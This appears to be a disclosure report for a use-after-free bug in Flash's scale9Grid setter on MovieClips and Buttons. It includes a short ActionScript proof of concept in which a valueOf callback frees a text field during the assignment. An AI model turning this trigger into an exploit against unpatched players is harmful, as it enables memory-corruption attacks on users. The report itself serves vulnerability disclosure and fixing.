There is a use-after-free issue if the scale9Grid setting is called on an object with a member that then frees display item. This issue occurs for both MovieClips and Buttons, it needs to be fixed in both classes.

A PoC is as follows:

var n = { valueOf : func };
var o = {x:n, y:0,width:10, height:10}

_global.mc = this
var newmc:MovieClip = this.createEmptyMovieClip("mymc",1)
mymc.scale9Grid = o


function func() {
	trace("here");
	var t = _global.mc.createTextField("test",1,1,1,2,3)
	t.removeTextField()
	return 7
}


A sample fla and swf is attached.
